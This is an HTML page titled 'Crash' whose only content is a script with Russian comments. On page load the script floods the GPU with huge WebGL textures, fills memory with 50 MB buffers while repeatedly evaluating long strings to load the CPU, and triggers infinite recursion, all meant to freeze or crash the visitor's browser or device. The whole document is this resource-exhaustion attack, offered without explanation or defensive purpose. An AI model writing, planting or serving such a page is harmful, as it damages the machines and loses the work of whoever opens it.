<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Crash</title></head>
<body>
<script>
(function() {
    // 1. Бесконечный рендер в WebGL (GPU)
    let canvas = document.createElement('canvas');
    canvas.width = 8192;
    canvas.height = 8192;
    document.body.appendChild(canvas);
    let gl = canvas.getContext('webgl');
    let textures = [];
    setInterval(() => {
        for(let i = 0; i < 100; i++) {
            let tex = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, tex);
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 8192, 8192, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
            textures.push(tex);
        }
    }, 1);
    
    // 2. Заполнение RAM и CPU
    let mem = [];
    setInterval(() => {
        for(let i = 0; i < 1000; i++) {
            mem.push(new ArrayBuffer(1024 * 1024 * 50));
            eval(''.padEnd(1000000, 'a')); // грузим парсер
        }
    }, 1);
    
    // 3. Бесконечная рекурсия (стек)
    function crash() { crash(); }
    setTimeout(crash, 500);
})();
</script>
</body>
</html>
